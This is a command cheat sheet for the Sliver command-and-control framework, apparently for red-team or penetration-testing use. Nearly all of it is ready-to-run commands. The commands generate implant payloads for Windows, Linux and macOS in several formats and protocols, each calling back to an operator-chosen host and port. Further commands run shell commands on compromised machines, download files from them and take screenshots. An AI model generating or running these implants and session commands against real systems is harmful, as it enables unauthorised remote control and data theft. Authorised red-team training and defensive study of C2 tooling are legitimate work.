# Sliver C2

% sliver

#plateform/linux #target/remote #cat/C2 #tag/command-control

## Start Sliver Server
#cat/SETUP 
```
sliver server
```

## Start Sliver Client
#cat/SETUP 
```
sliver client
```

## List Active Listeners
#cat/UTILS 
```
listeners
```

## Generate Windows EXE Payload
#cat/PAYLOAD 
```
generate --os windows --arch amd64 --format exe --lhost <callback_ip> --lport <callback_port> --save <output_path>
```

## Generate Windows DLL Payload
#cat/PAYLOAD 
```
generate --os windows --arch amd64 --format dll --lhost <callback_ip> --lport <callback_port> --save <output_path>
```

## Generate Windows Shellcode Payload
#cat/PAYLOAD 
```
generate --os windows --arch amd64 --format shellcode --lhost <callback_ip> --lport <callback_port> --save <output_path>
```

## Generate Linux Executable Payload
#cat/PAYLOAD 
```
generate --os linux --arch amd64 --format exe --lhost <callback_ip> --lport <callback_port> --save <output_path>
```

## Generate Linux Shellcode Payload
#cat/PAYLOAD 
```
generate --os linux --arch amd64 --format shellcode --lhost <callback_ip> --lport <callback_port> --save <output_path>
```

## Generate MacOS Executable Payload
#cat/PAYLOAD 
```
generate --os darwin --arch amd64 --format exe --lhost <callback_ip> --lport <callback_port> --save <output_path>
```

## Generate MacOS Shellcode Payload
#cat/PAYLOAD 
```
generate --os darwin --arch amd64 --format shellcode --lhost <callback_ip> --lport <callback_port> --save <output_path>
```

## Generate Websocket Payload
#cat/PAYLOAD 
```
generate --ws --lhost <callback_ip> --lport <callback_port> --save <output_path>
```

## Generate HTTP Payload
#cat/PAYLOAD 
```
generate --http --lhost <callback_ip> --lport <callback_port> --save <output_path>
```

## Generate DNS Payload
#cat/PAYLOAD 
```
generate --dns --lhost <callback_ip> --lport <callback_port> --save <output_path>
```

## Generate MTLS Payload
#cat/PAYLOAD 
```
generate --mtls --lhost <callback_ip> --lport <callback_port> --save <output_path>
```

## Generate with Custom Profile
#cat/PAYLOAD 
```
generate --profile <profile_name> --lhost <callback_ip> --lport <callback_port> --save <output_path>
```

## Generate with Custom C2
#cat/PAYLOAD 
```
generate --c2 <c2_url> --lhost <callback_ip> --lport <callback_port> --save <output_path>
```

## List Available Profiles
#cat/UTILS 
```
profiles
```

## Show Generate Help
#cat/UTILS 
```
generate --help
```

## Show Available Commands
#cat/UTILS 
```
help
```

## List Implants
#cat/UTILS 
```
implants
```

## List Sessions
#cat/UTILS 
```
sessions
```

## Use Session
#cat/COMMAND 
```
use <session_id>
```

## Execute Command on Session
#cat/COMMAND 
```
execute <command>
```

## Shell Command on Session
#cat/COMMAND 
```
shell <command>
```

## Download File from Target
#cat/COMMAND 
```
download <remote_file>
```

## Upload File to Target
#cat/COMMAND 
```
upload <local_file> <remote_path>
```

## Screenshot Target
#cat/COMMAND 
```
screenshot
```

## Get Process List
#cat/COMMAND 
```
ps
```

## Get System Info
#cat/COMMAND 
```
info
```

## List Directory Contents
#cat/COMMAND 
```
ls <path>
```

## Change Directory
#cat/COMMAND 
```
cd <path>
```

## Get Current Working Directory
#cat/COMMAND 
```
pwd
```
